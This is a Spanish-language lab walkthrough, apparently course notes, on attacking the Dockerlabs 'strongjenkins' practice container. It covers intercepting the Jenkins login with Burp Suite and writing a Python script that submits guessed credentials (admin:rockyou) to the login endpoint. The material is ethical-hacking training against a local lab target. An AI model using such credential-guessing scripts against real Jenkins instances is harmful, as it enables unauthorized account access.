
---

#Jenkins #Docker #SeguridadInformática #KaliLinux #BurpSuite #Python #Automatización #Vulnerabilidades #Dockerlabs #HackingÉtico #PruebasDePenetración #Scripts #Ciberseguridad #FuerzaBruta #Rockyou #Proxy #InterceptaciónHTTP #Login #Credenciales #AnálisisDeTráfico

---

## Proceso completo para desplegar y explotar la máquina vulnerable "strongjenkins"

### Paso 1: Descarga y despliegue de la máquina vulnerable "strongjenkins"

Mi primer paso fue obtener la máquina vulnerable "strongjenkins". Para ello, abrí mi navegador Firefox y visité la página oficial de Dockerlabs. Una vez allí, busqué entre las máquinas disponibles hasta encontrar "strongjenkins", que está clasificada como de nivel medio. Hice clic en el enlace de descarga y obtuve el archivo `strongjenkins.tar`, al extraer el archivo comprimido `strongjenkins.zip` el cual se guardó en mi directorio de descargas.

Luego, abrí una terminal en mi máquina virtual Kali Linux, que es mi sistema operativo principal para este tipo de tareas. Navegué al directorio donde se encontraba el archivo descargado y extraido usando el comando:

```bash
cd ~/Descargas
```

Con el archivo `strongjenkins.tar` en su lugar, procedí a desplegar la máquina utilizando el script proporcionado por Dockerlabs. Como este script requiere privilegios de superusuario, ejecuté el siguiente comando:

```bash
sudo bash auto_deploy.sh strongjenkins.tar
```

El script se puso en marcha y comenzó a realizar varias tareas automáticamente. Primero, verificó que Docker estuviera instalado y configurado en mi sistema. Como ya tenía Docker instalado previamente, no hubo problemas en este punto. Luego, el script cargó la imagen del archivo `.tar` en Docker y creó un contenedor basado en esa imagen. Mientras se ejecutaba, vi mensajes en la terminal como este:

```
Estamos desplegando la máquina vulnerable, espere un momento.
```

Tras unos segundos, el proceso finalizó y el script me mostró la siguiente salida:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Esto me indicó que la máquina vulnerable estaba activa en un contenedor Docker con la dirección IP `172.17.0.2`. También asumí que el servicio Jenkins estaría corriendo en el puerto 8080, ya que es el puerto predeterminado para Jenkins y el nombre "strongjenkins" lo sugería.

Para confirmar que todo funcionaba, abrí una nueva pestaña en Firefox y escribí la URL:

```
http://172.17.0.2:8080/
```

La página se cargó sin problemas, mostrando la interfaz de login de Jenkins con campos para ingresar un nombre de usuario y una contraseña. Esto me confirmó que la máquina estaba correctamente desplegada y accesible desde mi red local.

---

### Paso 2: Descarga del diccionario "rockyou"

Aunque no terminé utilizando un ataque de fuerza bruta completo, decidí descargar el diccionario "rockyou.txt" como recurso adicional. Abrí una nueva pestaña en Firefox y busqué el repositorio de GitHub donde está alojado este famoso diccionario de contraseñas. Una vez encontrado, hice clic en el enlace de descarga y guardé el archivo `rockyou.txt` en mi directorio de descargas.

Sin embargo, en lugar de usar este diccionario para probar miles de contraseñas, tuve una corazonada: dado que la máquina era vulnerable y el diccionario se llamaba "rockyou", quizás la contraseña correcta era simplemente "rockyou". Decidí probar esta teoría más adelante con el usuario "admin", pero primero necesitaba analizar cómo funcionaba el login de Jenkins.

---

### Paso 3: Configuración de Firefox y Burp Suite en Kali Linux

Para entender cómo el servidor Jenkins procesaba las solicitudes de login, decidí usar Burp Suite, una herramienta que me permite interceptar y analizar tráfico HTTP. Como estaba trabajando en Kali Linux, Burp Suite ya venía preinstalado, así que no tuve que instalar nada.

#### Configuración del proxy en Firefox

Primero, configuré Firefox para que enviara todo su tráfico a través de Burp Suite. Abrí el navegador y seguí estos pasos:

1. Hice clic en el menú de Firefox (las tres líneas en la esquina superior derecha) y seleccioné **Settings**.
2. En la pestaña **General**, desplacé hacia abajo hasta la sección **Network Settings** y hice clic en **Settings...**.
3. En la ventana que se abrió, elegí **Manual proxy configuration**.
4. En el campo **HTTP Proxy**, ingresé `127.0.0.1` (mi dirección local), y en el campo **Port**, ingresé `8080`, que es el puerto por defecto de Burp Suite.
5. Hice clic en **OK** para guardar los cambios.

Inicialmente, pensé en usar la IP del servidor Jenkins (`172.17.0.2:8080`) como proxy, pero me di cuenta de que eso era incorrecto. El proxy debía apuntar a Burp Suite en mi máquina local, no al servidor objetivo.

#### Configuración de Burp Suite

Con el proxy configurado en Firefox, abrí Burp Suite desde el menú de aplicaciones de Kali Linux. Una vez cargada la interfaz, navegué a la pestaña **Proxy** y luego a la subpestaña **Intercept**. Noté que decía "Intercept is off", lo que significa que las solicitudes pasarían sin ser capturadas. Hice clic en el botón para cambiarlo a "Intercept is on", activando la intercepción.

Para probar que todo estaba funcionando, volví a Firefox e intenté cargar nuevamente la URL:

```
http://172.17.0.2:8080/
```


![[01-Sistemas-Operativos/Linux/1- El Hacker Legendario 🐧🐍 - Fundamentos, Hacking y Certificaciones/3- Preparación para la Certificación del eJPTv2/2- Curso de Python Aplicado a la Ciberseguridad/0- Imagenes/3.1- Jenkins.png]]


Inmediatamente, Burp Suite interceptó la solicitud GET enviada por el navegador. En la pestaña **Intercept**, vi los detalles de la solicitud, incluyendo la línea `GET / HTTP/1.1`, las cabeceras HTTP y el host `172.17.0.2:8080`. Revisé rápidamente la información y luego hice clic en **Forward** para permitir que la solicitud continuara. La página de login de Jenkins se cargó en Firefox como esperaba, confirmando que mi configuración era correcta.

---

### Paso 4: Análisis de la solicitud de login con Burp Suite

Ahora que podía interceptar tráfico, decidí analizar la solicitud POST que se envía al intentar iniciar sesión en Jenkins. En la página de login en Firefox, ingresé credenciales aleatorias (usuario: "test", contraseña: "test") y hice clic en el botón **Sign in**.

Burp Suite capturó la solicitud POST resultante. En la pestaña **Intercept**, observé los siguientes detalles:

- **Método**: `POST`
- **URL**: `http://172.17.0.2:8080/j_spring_security_check`
- **Cuerpo de la solicitud** (datos del formulario en formato `application/x-www-form-urlencoded`):
  ```
  j_username=test&j_password=test&from=/&Submit=Sign+in
  ```
- **Cabeceras HTTP**:
  ```
  Host: 172.17.0.2:8080
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Origin: http://172.17.0.2:8080
  Connection: keep-alive
  Referer: http://172.17.0.2:8080/login?from=%2F
  Cookie: JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0
  Upgrade-Insecure-Requests: 1
  Priority: u=1
  ```

Esta información era clave. El endpoint `/j_spring_security_check` es el estándar de Jenkins para procesar logins, y los parámetros `j_username`, `j_password`, `from` y `Submit` eran los datos enviados en el formulario. También noté la presencia de una cookie `JSESSIONID`, que probablemente era necesaria para mantener la sesión activa con el servidor.

Hice clic en **Forward** para enviar la solicitud al servidor. Como las credenciales eran incorrectas, Jenkins me redirigió a una página de error, pero eso no importaba; mi objetivo era capturar la estructura de la solicitud para replicarla más tarde.

---

### Paso 5: Creación del script en Python con Visual Studio Code

Con los detalles de la solicitud en mano, decidí automatizar el proceso de login usando Python. Abrí Visual Studio Code desde el menú de aplicaciones de Kali Linux y creé un nuevo archivo llamado `inicio_desde_python.py`. A continuación, escribí el código paso a paso.

#### 1. Importar la librería `requests`
Para enviar solicitudes HTTP desde Python, necesitaba la librería `requests`. La importé con esta línea:

```python
import requests
```

#### 2. Definir la URL del endpoint
Basado en la solicitud capturada, definí la URL del endpoint de login:

```python
url = 'http://172.17.0.2:8080/j_spring_security_check'
```

#### 3. Crear los datos del formulario
Decidí probar con el usuario "admin" y la contraseña "rockyou", siguiendo mi corazonada. También incluí los parámetros adicionales que vi en la solicitud:

```python
acceso = {
    'j_username': 'admin',
    'j_password': 'rockyou',
    'from': '/',
    'Submit': 'Sign in'
}
```

#### 4. Definir las cabeceras HTTP
Para que mi solicitud pareciera legítima, copié las cabeceras de la solicitud capturada en Burp Suite:

```python
cabeceras = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}
```

Noté que la cookie `JSESSIONID` era específica de mi sesión. En un caso real, podría necesitar obtener una nueva cookie antes de intentar el login, pero decidí usar la misma asumiendo que la sesión seguía activa.

#### 5. Enviar la solicitud POST
Usé `requests.post` para enviar la solicitud, desactivando las redirecciones automáticas para analizar la respuesta inicial:

```python
respuesta = requests.post(url, headers=cabeceras, data=acceso, allow_redirects=False)
```

#### 6. Verificar el resultado
Sabía que un login exitoso devuelve un código 302 con una redirección a la página principal, mientras que un fallo redirige a `/loginError`. Implementé esta lógica:

```python
if respuesta.status_code == 302 and respuesta.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
    print("Login correcto con el usuario admin y contraseña rockyou")
else:
    print("Error de acceso: Login fallido")
```

El script completo quedó así:

```python
import requests

url = 'http://172.17.0.2:8080/j_spring_security_check'

acceso = {
    'j_username': 'admin',
    'j_password': 'rockyou',
    'from': '/',
    'Submit': 'Sign in'
}

cabeceras = {
    'Host': '172.17.0.2:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://172.17.0.2:8080',
    'Connection': 'keep-alive',
    'Referer': 'http://172.17.0.2:8080/login?from=%2F',
    'Cookie': 'JSESSIONID.b04dbd66=node01f6mvw75o6x2n159uzu5n0hqng1.node0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}

respuesta = requests.post(url, headers=cabeceras, data=acceso, allow_redirects=False)

if respuesta.status_code == 302 and respuesta.headers.get('Location') != 'http://172.17.0.2:8080/loginError':
    print("Login correcto con el usuario admin y contraseña rockyou")
else:
    print("Error de acceso: Login fallido")
```

---

### Paso 6: Ejecución del script y resultado

Guardé el archivo `inicio_desde_python.py` y abrí una terminal en el mismo directorio. Ejecuté el script con:

```bash
python3 inicio_desde_python.py
```

Tras unos instantes, obtuve esta salida:

```
Login correcto con el usuario admin y contraseña rockyou
```

Esto confirmó que las credenciales `admin:rockyou` eran correctas y que logré autenticarme en Jenkins de forma automatizada.

---

### Conclusión

En este proceso, descargué y desplegué la máquina "strongjenkins" usando Dockerlabs, configuré Firefox y Burp Suite para analizar las solicitudes HTTP, capturé la estructura del login, y creé y ejecuté un script en Python para autenticarme con éxito. 





[[tools]]
[[0- Comandos de Hacking]]
[[1- FTP]]
[[1- Protección del Protocolo SSH]]
[[1- basic tools]]
[[2- Protección del Protocolo FTP]]
[[2- Bash Scripting Aplicado a Ciberseguridad – Script para Hacer Fuzzing Web]]
[[4- Tiempos de craqueo]]
[[6- Securización de Servidores Web Apache – Evitar Ataques de Fuzzing Web – PARTE 4]]
[[7- Bucle WHILE – Iterar por Líneas]]
[[7- Oracle TNS]]
[[8- RDP]]
[[11- SSH]]
[[12- Herramienta para hacer cracking de contraseñas]]
[[13- Automatización de Cracking de Contraseñas]]

